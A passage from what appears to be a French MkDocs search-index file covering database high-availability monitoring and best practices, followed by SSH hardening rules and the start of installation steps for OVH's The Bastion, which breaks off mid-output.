mat\u00e9rielles, logicielles ou r\u00e9seau en temps r\u00e9el (exemple : un n\u0153ud d\u00e9faillant dans un cluster d\u00e9clenche automatiquement un basculement).</p> <p>Les journaux (logs) g\u00e9n\u00e9r\u00e9s par les bases de donn\u00e9es et les syst\u00e8mes HA sont essentiels pour identifier l\u2019origine des probl\u00e8mes. Les solutions de centralisation des logs (comme ELK Stack ou Splunk) facilitent cette t\u00e2che.</p> <p>Certains incidents peuvent \u00eatre g\u00e9r\u00e9s automatiquement gr\u00e2ce \u00e0 des scripts ou \u00e0 des m\u00e9canismes int\u00e9gr\u00e9s dans les solutions HA. Par exemple :</p> <ul> <li>Red\u00e9marrage automatique d\u2019un n\u0153ud hors ligne.</li> <li>R\u00e9initialisation d\u2019un processus de r\u00e9plication en cas d\u2019erreur.</li> </ul> <p>Maintenir une documentation claire des proc\u00e9dures \u00e0 suivre lors d\u2019incidents acc\u00e9l\u00e8re leur r\u00e9solution et garantit une intervention coh\u00e9rente par les \u00e9quipes.</p>"},{"location":"HD_BDD/#surveillance-des-mecanismes-de-replication-et-de-failover","title":"Surveillance des m\u00e9canismes de r\u00e9plication et de failover","text":"<p>R\u00e9plication des donn\u00e9es :</p> <ul> <li>V\u00e9rification r\u00e9guli\u00e8re que la r\u00e9plication (synchrone ou asynchrone) fonctionne correctement.</li> <li>D\u00e9tection des \u00e9carts dans la synchronisation pour \u00e9viter des pertes ou des incoh\u00e9rences de donn\u00e9es.</li> </ul> <p>Tests de basculement (failover) :</p> <ul> <li>Simuler des pannes pour s\u2019assurer que les m\u00e9canismes de failover fonctionnent sans perte de donn\u00e9es ni interruption notable.</li> <li>Ces tests incluent le basculement automatique (cas d\u2019une panne) et manuel (cas de maintenance planifi\u00e9e).</li> </ul>"},{"location":"HD_BDD/#automatisation-de-la-supervision-et-de-la-maintenance","title":"Automatisation de la supervision et de la maintenance","text":"<p>L\u2019automatisation des t\u00e2ches r\u00e9p\u00e9titives va \u00eatre r\u00e9alis\u00e9e gr\u00e2ce \u00e0 l\u2019utilisation de scripts ou d\u2019outils comme Ansible, Puppet, ou Terraform pour g\u00e9rer la configuration et les mises \u00e0 jour.</p> <p>Certaines solutions avanc\u00e9es permettent d\u2019ex\u00e9cuter des actions correctives sans intervention humaine, comme red\u00e9marrer un service en panne ou r\u00e9\u00e9quilibrer la charge sur un cluster.</p> <p>En outre, dans les environnements cloud, les bases de donn\u00e9es peuvent automatiquement ajuster leurs ressources (CPU, m\u00e9moire, stockage) en fonction de la charge.</p>"},{"location":"HD_BDD/#reporting-et-amelioration-continue","title":"Reporting et am\u00e9lioration continue","text":"<p>La g\u00e9n\u00e9ration de rapports sur les performances, la disponibilit\u00e9 et les incidents est essentielle pour \u00e9valuer la sant\u00e9 globale des syst\u00e8mes.</p> <p>Il est de m\u00eame vis-\u00e0-vis de l\u2019analyse des incidents pass\u00e9s pour :</p> <ul> <li>comprendre les causes racines (root cause analysis) pour pr\u00e9venir des probl\u00e8mes similaires.</li> <li>identifier les lacunes dans les processus ou les outils.</li> </ul> <p>En se basant sur les donn\u00e9es collect\u00e9es, il est possible d\u2019am\u00e9liorer les configurations, d\u2019affiner les seuils d\u2019alerte et de mettre en place des solutions plus robustes.</p>"},{"location":"HD_BDD/#conclusion","title":"Conclusion","text":"<p>La supervision et la maintenance des bases de donn\u00e9es haute disponibilit\u00e9 exigent une combinaison d\u2019outils, de processus rigoureux et de comp\u00e9tences sp\u00e9cialis\u00e9es. Une surveillance proactive associ\u00e9e \u00e0 une automatisation intelligente minimise les risques d\u2019interruption, tandis que des tests r\u00e9guliers et des optimisations continues permettent de garantir une disponibilit\u00e9 maximale et des performances optimales. Ces pratiques, bien mises en \u0153uvre, assurent la p\u00e9rennit\u00e9 des syst\u00e8mes critiques dans des environnements de plus en plus exigeants.</p>"},{"location":"HD_BDD/#recommandations-et-bonnes-pratiques","title":"Recommandations et bonnes pratiques","text":""},{"location":"HD_BDD/#design-darchitecture-robuste","title":"Design d\u2019architecture robuste","text":"<p>Pour cr\u00e9er une architecture de base de donn\u00e9es robuste, il est essentiel de combiner plusieurs strat\u00e9gies cl\u00e9s : une planification rigoureuse avec une mod\u00e9lisation conceptuelle pr\u00e9cise, une normalisation efficace des donn\u00e9es, une indexation optimale, des m\u00e9canismes de s\u00e9curit\u00e9 avanc\u00e9s, des solutions de haute disponibilit\u00e9 et de r\u00e9plication, une gestion performante des transactions, des processus de sauvegarde et de r\u00e9cup\u00e9ration fiables, un monitoring constant, et un choix technologique adapt\u00e9 aux besoins sp\u00e9cifiques, en privil\u00e9giant la scalabilit\u00e9, les performances et la coh\u00e9rence des donn\u00e9es.</p> <p>Une conception modulaire avec \u00e9limination des Single Points of Failure (SPOF) vise \u00e0 structurer le syst\u00e8me de mani\u00e8re \u00e0 ce qu'aucun composant unique ne puisse provoquer une panne totale. Cela peut \u00eatre r\u00e9alis\u00e9 en d\u00e9composant l'architecture en modules ind\u00e9pendants qui peuvent fonctionner de mani\u00e8re autonome. Chaque module doit disposer de redondance interne, de sorte qu'une d\u00e9faillance au sein d'un module n'affecte pas les autres. Par exemple, dans une architecture de base de donn\u00e9es, cela pourrait inclure des instances multiples de serveurs de bases de donn\u00e9es avec des m\u00e9canismes de r\u00e9plication et de basculement automatique pour assurer la continuit\u00e9 de service. L'utilisation de services de surveillance et d'alertes permet \u00e9galement de d\u00e9tecter et de r\u00e9agir rapidement aux d\u00e9faillances, renfor\u00e7ant ainsi la r\u00e9silience globale du syst\u00e8me.</p> <p>Exploiter les zones de disponibilit\u00e9 et les r\u00e9gions g\u00e9ographiques. Cela implique de d\u00e9ployer les bases de donn\u00e9es et les services connexes sur plusieurs centres de donn\u00e9es physiquement distincts. Les zones de disponibilit\u00e9 sont des centres de donn\u00e9es isol\u00e9s dans une m\u00eame r\u00e9gion g\u00e9ographique, offrant une redondance locale. L'utilisation de plusieurs zones assure que m\u00eame si une zone devient indisponible, les autres zones continuent \u00e0 fonctionner, minimisant ainsi les interruptions de service. Les r\u00e9gions g\u00e9ographiques, quant \u00e0 elles, permettent de d\u00e9ployer des services \u00e0 travers diff\u00e9rents endroits g\u00e9ographiques pour garantir la continuit\u00e9 des op\u00e9rations \u00e0 une \u00e9chelle mondiale. Cette strat\u00e9gie, appel\u00e9e multizones et multir\u00e9gions, am\u00e9liore la r\u00e9silience aux pannes, r\u00e9duit la latence pour les utilisateurs situ\u00e9s dans diff\u00e9rentes parties du monde, et assure une r\u00e9cup\u00e9ration rapide en cas de catastrophe naturelle ou de panne majeure affectant une r\u00e9gion enti\u00e8re.</p>"},{"location":"HD_BDD/#tests-reguliers","title":"Tests r\u00e9guliers","text":"<p>L'objectif principal des tests de haute disponibilit\u00e9 est de garantir une continuit\u00e9 de service optimale et une r\u00e9silience op\u00e9rationnelle maximale. Cette d\u00e9marche implique une \u00e9valuation approfondie de l'infrastructure de base de donn\u00e9es \u00e0 travers plusieurs axes strat\u00e9giques.</p>"},{"location":"HD_BDD/#les-tests-de-basculement","title":"Les tests de basculement","text":"<p>Constituent une premi\u00e8re \u00e9tape cruciale, visant \u00e0 simuler des sc\u00e9narios de panne serveur et \u00e0 v\u00e9rifier les m\u00e9canismes automatiques de reprise. Il s'agit de mesurer pr\u00e9cis\u00e9ment le temps de transition entre serveurs primaires et secondaires, tout en \u00e9valuant l'impact minimal sur les performances du syst\u00e8me.</p>"},{"location":"HD_BDD/#la-validation-de-la-replication-et-de-la-synchronisation","title":"La validation de la r\u00e9plication et de la synchronisation","text":"<p>Cela repr\u00e9sente un volet essentiel de cette strat\u00e9gie. Les \u00e9quipes techniques doivent contr\u00f4ler rigoureusement la coh\u00e9rence des donn\u00e9es, tester la r\u00e9plication en temps r\u00e9el et analyser les potentiels temps de latence. L'objectif est de garantir l'int\u00e9grit\u00e9 totale des donn\u00e9es lors des transferts inter-syst\u00e8mes.</p>"},{"location":"HD_BDD/#les-tests-de-charge","title":"Les tests de charge","text":"<p>Ils permettent de soumettre l'infrastructure \u00e0 des conditions extr\u00eames, en simulant des pics de connexions simultan\u00e9es et en identifiant les limites de performance du syst\u00e8me. Cette approche permet de comprendre le comportement de la base de donn\u00e9es sous contrainte et d'anticiper d'\u00e9ventuels points de d\u00e9faillance.</p>"},{"location":"HD_BDD/#la-gestion-des-scenarios-de-recuperation","title":"La gestion des sc\u00e9narios de r\u00e9cup\u00e9ration","text":"<p>Apr\u00e8s sinistre, elle constitue un \u00e9l\u00e9ment diff\u00e9renciant. Il devient primordial de tester syst\u00e9matiquement les proc\u00e9dures de restauration, de valider les temps de r\u00e9cup\u00e9ration et de simuler des reconstructions compl\u00e8tes, garantissant ainsi une capacit\u00e9 de r\u00e9silience optimale.</p>"},{"location":"HD_BDD/#les-recommandations-finales","title":"Les recommandations finales","text":"<ul> <li>Automatiser au maximum les proc\u00e9dures de test</li> <li>Documenter pr\u00e9cis\u00e9ment chaque sc\u00e9nario</li> <li>R\u00e9aliser des tests r\u00e9guliers et planifi\u00e9s</li> <li>Impliquer les \u00e9quipes techniques et op\u00e9rationnelles</li> </ul>"},{"location":"HD_BDD/#livrables-attendus","title":"Livrables attendus","text":"<ul> <li>Rapports d\u00e9taill\u00e9s de tests</li> <li>Matrices de performance</li> <li>Recommandations d'am\u00e9lioration</li> <li>Plan de mitigation des risques</li> </ul>"},{"location":"HD_BDD/#documentation-et-formation","title":"Documentation et formation","text":"<p>La haute disponibilit\u00e9 des bases de donn\u00e9es repose sur une approche int\u00e9gr\u00e9e combinant documentation technique, r\u00e9f\u00e9rentiel de connaissances et programme de formation rigoureux. La documentation technique doit cartographier pr\u00e9cis\u00e9ment l'infrastructure, d\u00e9tailler les configurations des serveurs et d\u00e9finir exhaustivement les proc\u00e9dures op\u00e9rationnelles de basculement, restauration et gestion de crise.</p>"},{"location":"HD_BDD/#referentiel-centralise-de-connaissances","title":"R\u00e9f\u00e9rentiel centralis\u00e9 de connaissances","text":"<p>Garantit la tra\u00e7abilit\u00e9 et l'accessibilit\u00e9 des informations, permettant un partage efficace entre les \u00e9quipes techniques. Les programmes de formation doivent alterner sessions th\u00e9oriques sur l'architecture des bases de donn\u00e9es et exercices pratiques de simulation, incluant des ateliers de gestion de pannes et de restauration.</p>"},{"location":"HD_BDD/#la-certification-interne-des-competences","title":"La certification interne des comp\u00e9tences","text":"<p>Permet de d\u00e9velopper une expertise technique solide. Un dispositif de veille technologique permanent et des communaut\u00e9s de pratiques favorisent l'apprentissage continu et l'adaptation aux \u00e9volutions technologiques.</p>"},{"location":"HD_BDD/#retours-dexperiences-retex","title":"Retours d\u2019exp\u00e9riences (RETEX)","text":"<p>Il est aussi important de cr\u00e9er des RETEX document\u00e9s sur les pannes rencontr\u00e9es afin de pouvoir comprendre et r\u00e9soudre avec une r\u00e9activit\u00e9 accrue une situation similaire dans l\u2019avenir.</p> <p>L'objectif ultime est de cr\u00e9er un \u00e9cosyst\u00e8me de comp\u00e9tences r\u00e9silient, capable de garantir en permanence la disponibilit\u00e9 et la performance des syst\u00e8mes de bases de donn\u00e9es, en impliquant l'ensemble des \u00e9quipes dans une culture de la transparence et de l'am\u00e9lioration continue.</p>"},{"location":"HD_BDD/#planification-a-long-terme","title":"Planification \u00e0 long terme","text":""},{"location":"HD_BDD/#strategie-anticipative","title":"Strat\u00e9gie anticipative","text":"<p>La haute disponibilit\u00e9 des bases de donn\u00e9es \u00e0 long terme repose sur ce type de strat\u00e9gie qui n\u00e9cessite une compr\u00e9hension approfondie des dynamiques de croissance. L'analyse prospective constitue le socle de cette d\u00e9marche, impliquant une projection pr\u00e9cise des volumes de donn\u00e9es, des \u00e9volutions technologiques et des usages futurs.</p> <p>L'architecture repr\u00e9sente le levier principal de cette strat\u00e9gie. Il devient essentiel de concevoir des infrastructures flexibles, modulaires et \u00e9lastiques, privil\u00e9giant des solutions cloud, des technologies de conteneurisation et des architectures distribu\u00e9es capables d'absorber naturellement la croissance. La scalabilit\u00e9 horizontale et les m\u00e9canismes de partitionnement dynamique deviennent des composantes structurantes de cette approche.</p>"},{"location":"HD_BDD/#la-gestion-dynamique-des-ressources-et-la-resilience","title":"La gestion dynamique des ressources et la r\u00e9silience","text":"<p>Ce sont des dimensions critiques. Les organisations doivent d\u00e9velopper des m\u00e9canismes de provisionnement automatique, d\u00e9finir des seuils d'alerte intelligents et mettre en place des strat\u00e9gies de r\u00e9plication multi-sites garantissant la continuit\u00e9 op\u00e9rationnelle. Le monitoring constant et l'optimisation proactive permettent d'anticiper et de corriger les potentiels goulots d'\u00e9tranglement.</p>"},{"location":"HD_BDD/#la-veille-technologique-et-ladaptabilite","title":"La veille technologique et l'adaptabilit\u00e9","text":"<p>Elles configurent la dimension strat\u00e9gique de long terme. Maintenir une flexibilit\u00e9 architecturale, budg\u00e9ter des capacit\u00e9s d'\u00e9volution et int\u00e9grer une culture d'innovation continue permettent aux syst\u00e8mes de bases de donn\u00e9es de rester performants et align\u00e9s avec les mutations organisationnelles.</p> <p>L'objectif est de construire une infrastructure num\u00e9rique r\u00e9siliente, capable de s'adapter dynamiquement aux besoins \u00e9mergents, tout en garantissant une disponibilit\u00e9 maximale, des performances optimales et une \u00e9volutivit\u00e9 sans discontinuit\u00e9.</p>"},{"location":"HD_BDD/#outils-et-technologies","title":"Outils et technologies","text":"<p>Afin de garantir la haute disponibilit\u00e9 des bases de donn\u00e9es en entreprise, il est crucial de s\u00e9lectionner des outils et des technologies adapt\u00e9s \u00e0 vos besoins sp\u00e9cifiques et \u00e0 vos ressources disponibles.</p>"},{"location":"HD_BDD/#choisir-des-solutions-eprouvees-et-adaptees-aux-besoins-specifiques","title":"Choisir des solutions \u00e9prouv\u00e9es et adapt\u00e9es aux besoins sp\u00e9cifiques","text":"<p>Optez pour des solutions robustes et test\u00e9es dans le secteur, comme PostgreSQL ou MySQL pour des bases de donn\u00e9es relationnelles.</p> <p>\u00c9valuez les besoins sp\u00e9cifiques de votre entreprise, tels que le volume de donn\u00e9es, les temps de r\u00e9ponse n\u00e9cessaires, et la nature des transactions.</p> <p>Consid\u00e9rez les fonctionnalit\u00e9s offertes par chaque solution, comme la r\u00e9plication, le partitionnement, et le support pour des architectures multi-r\u00e9gions.</p>"},{"location":"HD_BDD/#preferer-des-solutions-open-source-ou-commerciales-selon-les-ressources-disponibles","title":"Pr\u00e9f\u00e9rer des solutions open source ou commerciales selon les ressources disponibles","text":"<p>Les solutions open source, comme PostgreSQL ou MongoDB, offrent une grande flexibilit\u00e9 et une communaut\u00e9 active pour le support. Elles sont id\u00e9ales pour des entreprises avec des ressources limit\u00e9es.</p> <p>Les solutions commerciales, comme Oracle Database ou Microsoft SQL Server, peuvent offrir des garanties de service (SLA), un support technique d\u00e9di\u00e9, et des fonctionnalit\u00e9s avanc\u00e9es. Elles conviennent aux entreprises pr\u00eates \u00e0 investir davantage pour une tranquillit\u00e9 d'esprit et des performances optimales.</p> <p>\u00c9valuez les co\u00fbts totaux d\u2019exploitation (TCO), incluant les co\u00fbts de licence, de maintenance, et de support, ainsi que les co\u00fbts associ\u00e9s \u00e0 la formation et \u00e0 la gestion des comp\u00e9tences internes.</p>"},{"location":"HD_BDD/#synthese-des-bonnes-pratiques-de-dimplementation-de-la-hd-ha-des-bases-de-donnees","title":"Synth\u00e8se des bonnes pratiques de d\u2019impl\u00e9mentation de la HD | HA des bases de donn\u00e9es","text":"<p>Dans l\u2019objectif de d\u00e9ployer une infrastructure avec de la haute disponibilit\u00e9 dans les bases de donn\u00e9es</p> <ol> <li> <p>R\u00e9plication de bases de donn\u00e9es</p> </li> <li> <p>Mettre en place une r\u00e9plication synchrone ou asynchrone</p> </li> <li>Utiliser des configurations ma\u00eetre-esclave ou multi-ma\u00eetres</li> <li>Assurer une coh\u00e9rence des donn\u00e9es entre les diff\u00e9rentes instances</li> <li> <p>Minimiser le temps de latence lors de la r\u00e9plication</p> </li> <li> <p>Clustering et basculement automatique</p> </li> <li> <p>Configurer des clusters de bases de donn\u00e9es</p> </li> <li>Impl\u00e9menter des m\u00e9canismes de basculement automatique (failover)</li> <li>Utiliser des solutions comme PostgreSQL Patroni, MySQL Cluster, Oracle RAC</li> <li> <p>Garantir une continuit\u00e9 de service en cas de panne d'un n\u0153ud</p> </li> <li> <p>Strat\u00e9gies de r\u00e9partition de charge</p> </li> <li> <p>Utiliser des load balancers sp\u00e9cialis\u00e9s pour bases de donn\u00e9es</p> </li> <li>R\u00e9partir les requ\u00eates de lecture sur plusieurs serveurs</li> <li>Maintenir un serveur principal d\u00e9di\u00e9 aux \u00e9critures</li> <li> <p>Optimiser les performances et la r\u00e9activit\u00e9 du syst\u00e8me</p> </li> <li> <p>Sauvegarde et restauration</p> </li> <li> <p>Mettre en place des sauvegardes r\u00e9guli\u00e8res et incr\u00e9mentales</p> </li> <li>Stocker les sauvegardes sur des sites distants</li> <li>Tester p\u00e9riodiquement les processus de restauration</li> <li> <p>Utiliser des technologies comme point-in-time recovery (PITR)</p> </li> <li> <p>Techniques de partitionnement</p> </li> <li> <p>Impl\u00e9menter le sharding pour r\u00e9partir les donn\u00e9es</p> </li> <li>Cr\u00e9er des partitions horizontales ou verticales</li> <li>Am\u00e9liorer les performances et la scalabilit\u00e9</li> <li> <p>Faciliter la gestion et la maintenance des grandes bases de donn\u00e9es</p> </li> <li> <p>R\u00e9silience g\u00e9ographique</p> </li> <li> <p>D\u00e9ployer des bases de donn\u00e9es sur plusieurs zones g\u00e9ographiques</p> </li> <li>Utiliser des solutions de g\u00e9o-r\u00e9plication</li> <li>Assurer la continuit\u00e9 en cas de sinistre r\u00e9gional</li> <li> <p>R\u00e9duire le risque de perte de donn\u00e9es</p> </li> <li> <p>Surveillance et monitoring</p> </li> <li> <p>Mettre en place des outils de supervision sp\u00e9cialis\u00e9s</p> </li> <li>Surveiller les performances, la latence, l'utilisation des ressources</li> <li>Configurer des alertes proactives</li> <li> <p>Analyser les logs et les m\u00e9triques de performance</p> </li> <li> <p>S\u00e9curit\u00e9 et chiffrement</p> </li> <li> <p>Impl\u00e9menter le chiffrement des donn\u00e9es au repos et en transit</p> </li> <li>G\u00e9rer finement les acc\u00e8s et les droits</li> <li>Mettre en place des m\u00e9canismes de protection contre les intrusions</li> <li> <p>Assurer la conformit\u00e9 r\u00e9glementaire</p> </li> <li> <p>Solutions cloud et conteneuris\u00e9es</p> </li> <li> <p>Utiliser des services de bases de donn\u00e9es manag\u00e9es (RDS, Cloud SQL)</p> </li> <li>D\u00e9ployer dans des environnements conteneuris\u00e9s</li> <li>B\u00e9n\u00e9ficier des capacit\u00e9s de scalabilit\u00e9 et de r\u00e9silience du cloud</li> <li> <p>Simplifier la gestion et la maintenance</p> </li> <li> <p>Optimisation et test</p> </li> <li> <p>R\u00e9aliser des tests de charge et de mont\u00e9e en puissance</p> </li> <li>Simuler des sc\u00e9narios de d\u00e9faillance</li> <li>Optimiser continuellement les configurations</li> <li>Adapter l'infrastructure aux \u00e9volutions des besoins</li> </ol>"},{"location":"HD_BDD/#webographie","title":"Webographie","text":"<p>Qu\u2019est ce que la haute disponibilit\u00e9 informatique concr\u00e8tement ? [21/12/2021]</p> <p>RedHat La haute disponibilit\u00e9, qu'est-ce que c'est ? [25/10/2024]</p> <p>Crit\u00e8res de la haute disponibilit\u00e9 [14/04/2021]</p> <p>Determining Your High Availability Requirements [01/06/2004]</p> <p>Base de donn\u00e9es: Pourquoi est-ce crucial pour une entreprise ? [28/04/2023]</p> <p>Explication du syst\u00e8me de gestion de base de donn\u00e9es (SGBD) [16/03/2020]</p> <p>Vous avez un compte client chez Boulanger ? [09/09/2024] </p> <p>Cyberattaque de Free : on sait enfin ce qu\u2019il s\u2019est pass\u00e9. [09/12/2024]_  </p> <p>Qu\u2019est-ce qu\u2019une base de donn\u00e9es cloud ? [NC]</p> <p>Sauvegarde et restauration des donn\u00e9es : le guide essentiel [NC] </p> <p>Qu'est-ce qu'une base de donn\u00e9es distribu\u00e9e ? [NC] </p> <p>Haute Disponibilit\u00e9 [19/08/24] </p> <p>Comment assurer la haute disponibilit\u00e9 d\u2019une base de donn\u00e9es relationnelle ? [NC] </p> <p>High Availability with MariaDB [2024] </p> <p>\u00c0 propos de la haute disponibilit\u00e9 [05/12/2024] </p>"},{"location":"Hardening_Etinzon_Nathan/","title":"Hardening SSH","text":""},{"location":"Hardening_Etinzon_Nathan/#bonnes-pratiques-implementation-ssh","title":"Bonnes pratiques - Impl\u00e9mentation SSH","text":"<ul> <li>R\u00e9f\u00e9rences:  <ul> <li>https://cyber.gouv.fr/publications/usage-securise-dopenssh </li> <li>https://www.ssh-audit.com/hardening_guides.html</li> </ul> </li> </ul> <ol> <li> <p>Seule la version 2 du protocole SSH doit \u00eatre autoris\u00e9e.</p> </li> <li> <p>Les serveurs d\u2019acc\u00e8s distants TELNET, RSH, RLOGIN doivent \u00eatre d\u00e9sinstall\u00e9s du syst\u00e8me.</p> </li> <li> <p>SCP ou SFTP doivent \u00eatre utilis\u00e9s en lieu et place de protocoles historiques (RCP, FTP) pour du transfert ou du t\u00e9l\u00e9chargement de fichiers.</p> </li> <li> <p>L\u2019usage de cl\u00e9s DSA n\u2019est pas recommand\u00e9.</p> </li> <li> <p>La taille de cl\u00e9 minimale doit \u00eatre de 2048 bits pour RSA.</p> </li> <li> <p>La taille de cl\u00e9 minimale doit \u00eatre de 256 bits pour ECDSA.</p> </li> <li> <p>Lorsque les clients et les serveurs SSH supportent ECDSA, son usage doit \u00eatre pr\u00e9f\u00e9r\u00e9 \u00e0 RSA.</p> </li> <li> <p>Les cl\u00e9s doivent \u00eatre g\u00e9n\u00e9r\u00e9es dans un contexte o\u00f9 la source d\u2019al\u00e9a est fiable, ou \u00e0 d\u00e9faut dans un environnement o\u00f9 suffisamment d\u2019entropie a \u00e9t\u00e9 accumul\u00e9e.</p> </li> <li> <p>Quelques r\u00e8gles permettent de s\u2019assurer que le r\u00e9servoir d\u2019entropie est correctement rempli :  </p> <ol> <li>la machine de g\u00e9n\u00e9ration de cl\u00e9s doit \u00eatre une machine physique ;</li> <li>elle doit disposer de plusieurs sources d\u2019entropie ind\u00e9pendantes ;</li> <li>l\u2019al\u00e9a ne doit \u00eatre obtenu qu\u2019apr\u00e8s une p\u00e9riode d\u2019activit\u00e9 suffisamment importante (plusieurs minutes voire heures).</li> </ol> </li> <li> <p>La cl\u00e9 priv\u00e9e ne doit \u00eatre connue que de l\u2019entit\u00e9 qui cherche \u00e0 prouver son identit\u00e9 \u00e0 un tiers et \u00e9ventuellement d\u2019une autorit\u00e9 de confiance. Cette cl\u00e9 priv\u00e9e doit \u00eatre d\u00fbment prot\u00e9g\u00e9e pour en \u00e9viter la diffusion \u00e0 une personne non autoris\u00e9e</p> </li> <li> <p>L\u2019AES-128 mode CBC doit \u00eatre utilis\u00e9 comme algorithme de chiffrement pour la protection de la cl\u00e9 priv\u00e9e utilisateur par mot de passe.</p> </li> <li> <p>L\u2019algorithme de chiffrement doit reposer sur de l\u2019AES 128, AES 192 ou AES 256, en mode CTR. L\u2019int\u00e9grit\u00e9 doit reposer sur du HMAC SHA-1, SHA-256 ou SHA-512.</p> </li> <li> <p>Une \u00e9tape pr\u00e9liminaire \u00e0 ce durcissement est donc d\u2019user de drapeaux de compilation ad\u00e9quats. Se rapporter par exemple aux \"Recommandations de s\u00e9curit\u00e9 relatives \u00e0 un syst\u00e8me GNU/Linux\".</p> </li> <li> <p>L\u2019authentification d\u2019un utilisateur doit se faire \u00e0 l\u2019aide d\u2019un des m\u00e9canismes suivants, par ordre de pr\u00e9f\u00e9rence :</p> <ul> <li>par cryptographie asym\u00e9trique ECDSA;</li> <li>par cryptographie asym\u00e9trique RSA;</li> <li>par cryptographie sym\u00e9trique (tickets Kerberos par la GSSAPI) ;</li> <li>PAM (ou BSD Auth) permettant de faire appel \u00e0 des modules d\u2019authentification tiers n\u2019exposant pas le mot de passe utilisateur ou son condensat (OTP) ;</li> <li>par mot de passe vis \u00e0 vis d\u2019une base de donn\u00e9es comme passwd/shadow ou annuaire.</li> </ul> </li> <li> <p>Les droits d\u2019un utilisateur doivent suivre le principe de moindre privil\u00e8ge. La restriction peut porter sur de nombreux param\u00e8tres : commandes accessibles, adresses IPs d\u2019origine, droit de redirections ou de forwarding</p> </li> <li> <p>L\u2019usage du m\u00e9canisme d\u2019agent forwarding (option -A de ssh) est recommand\u00e9 dans les cas o\u00f9 un rebond SSH est n\u00e9cessaire au travers d\u2019un serveur h\u00f4te relais.</p> </li> <li> <p>Le serveur h\u00f4te relais doit \u00eatre un h\u00f4te de confiance.</p> </li> <li> <p>Chaque utilisateur doit disposer de son propre compte, unique, incessible.</p> </li> <li> <p>Les acc\u00e8s \u00e0 un service doivent \u00eatre restreints aux utilisateurs qui en ont un besoin justifi\u00e9. Cette restriction doit s\u2019appliquer en droits positifs : uniquement ceux explicitement autoris\u00e9s ont le droit de se connecter en SSH sur un h\u00f4te, et \u00e9ventuellement en provenance d\u2019adresses IP sp\u00e9cifi\u00e9es.</p> </li> <li> <p>L\u2019alt\u00e9ration de l\u2019environnement par un utilisateur doit \u00eatre bloqu\u00e9e par d\u00e9faut. Les variables autoris\u00e9es \u00e0 la modification par le client doivent \u00eatre s\u00e9lectionn\u00e9es au cas par cas.</p> </li> <li> <p>Les commandes lanc\u00e9es par un utilisateur au travers d\u2019une session SSH doivent \u00eatre r\u00e9duites au strict n\u00e9cessaire ; cette restriction peut \u00eatre mise en place par l\u2019utilisation :</p> <ul> <li>de la directive ForceCommand pour un utilisateur donn\u00e9, dans le fichier sshd_config ;</li> <li>en sp\u00e9cifiant des options dans le fichier authorized_keys ;</li> <li>de binaires d\u00fbment prot\u00e9g\u00e9s comme sudo ou su.</li> </ul> </li> <li> <p>Le serveur SSH doit \u00e9couter uniquement sur une adresse d\u2019administration</p> </li> <li> <p>Lorsque le serveur SSH est expos\u00e9 \u00e0 un r\u00e9seau non ma\u00eetris\u00e9, il est recommand\u00e9 de lui mettre un port d\u2019\u00e9coute diff\u00e9rent du port par d\u00e9faut (22).</p> </li> <li> <p>Il faut privil\u00e9gier un port inf\u00e9rieur \u00e0 1024 afin d\u2019emp\u00eacher les tentatives d\u2019usurpation par des services non administrateur sur la machine distante.</p> </li> <li> <p>Sur un r\u00e9seau ma\u00eetris\u00e9, le serveur SSH doit \u00e9couter uniquement sur une interface du r\u00e9seau d\u2019administration, distinct du r\u00e9seau op\u00e9rationnel.</p> </li> <li> <p>Sauf besoin d\u00fbment justifi\u00e9, toute fonctionnalit\u00e9 de redirections de flux doit \u00eatre d\u00e9sactiv\u00e9e :</p> <ul> <li>au niveau de la configuration du serveur SSH ;</li> <li>au niveau du pare-feu local en bloquant les connexions.</li> </ul> </li> <li> <p>La redirection X11 doit \u00eatre d\u00e9sactiv\u00e9e sur le serveur.</p> </li> <li> <p>Il est recommand\u00e9 de cr\u00e9er des ACs distinctes lorsque leurs r\u00f4les diff\u00e8rent. On aura par exemple :</p> <ul> <li>une qui jouera le r\u00f4le d\u2019AC \u00ab h\u00f4te \u00bb ;</li> <li>une qui jouera le r\u00f4le d\u2019AC \u00abutilisateurs\u00bb.</li> </ul> </li> <li> <p>Chaque cl\u00e9 priv\u00e9e d\u2019une AC doit \u00eatre prot\u00e9g\u00e9e par un mot de passe unique, robuste.</p> </li> <li> <p>Dans le cas o\u00f9 une cl\u00e9 ne peut plus \u00eatre consid\u00e9r\u00e9e comme s\u00fbre, l\u2019usage de celle-ci doit \u00eatre rapidement r\u00e9voqu\u00e9 au niveau de SSH.</p> </li> <li> <p>La validation des empreintes SSH h\u00f4te envoy\u00e9es par le serveur DNS ne doit pas se faire sans une v\u00e9rification compl\u00e9mentaire.</p> </li> </ol>"},{"location":"Hardening_Etinzon_Nathan/#the-bastion","title":"The Bastion","text":"<ul> <li>R\u00e9f\u00e9rences:<ul> <li>https://ovh.github.io/the-bastion/</li> </ul> </li> </ul>"},{"location":"Hardening_Etinzon_Nathan/#telechargement","title":"T\u00e9l\u00e9chargement","text":"<p><code>wget https://github.com/ovh/the-bastion/archive/refs/tags/v3.16.01.tar.gz</code> <code>mkdir -p /opt/bastion</code> <code>tar -C /opt/bastion -zxf v3.16.99-rc1.tar.gz</code> </p>"},{"location":"Hardening_Etinzon_Nathan/#installation","title":"Installation","text":"<p><code>/opt/bastion/bin/admin/packages-check.sh -i</code></p>"},{"location":"Hardening_Etinzon_Nathan/#setup","title":"Setup","text":"<p><code>/opt/bastion/bin/admin/install --new-install</code></p>"},{"location":"Hardening_Etinzon_Nathan/#check","title":"Check","text":"<p><code>/opt/bastion/bin/dev/perl-check.sh</code></p>"},{"location":"Hardening_Etinzon_Nathan/#creation-du-premier-compte","title":"Cr\u00e9ation du premier compte","text":"<p><code>/opt/bastion/bin/admin/setup-first-admin-account.sh USERNAME auto</code></p>"},{"location":"Hardening_Etinzon_Nathan/#configuration-client-pour-se-connecter-au-bastion","title":"Configuration Client (pour se connecter au bastion)","text":"<p>Cr\u00e9ation d'un alias pour \u00e9viter de se taper la commande enti\u00e8re h24 <code>alias bssh='ssh -t myname@the-bastion.example.org --'</code></p>"},{"location":"Hardening_Etinzon_Nathan/#configuration-serveur","title":"Configuration Serveur","text":"<p>R\u00e9cup\u00e9rer la cl\u00e9 EgressKey dans le terminal du bastion </p> <pre><code> bssh(master)&gt; `selfListEgressKeys`  \n ---the-bastion.example.org----------------------------the-bastion-2.99.99-rc9---  \n =&gt; the public part of your personal bastion key  \n --------------------------------------------------------------------------------  \n ~ You can copy one of those keys to a remote machine to get access to it through your account  \n ~ on this bastion, if it is listed in your private access list (check selfListAccesses)  \n ~  \n ~ Always include the from=\"198.51.100.1/32\" part when copying the key to a server!  \n ~  \n ~ fingerprint: 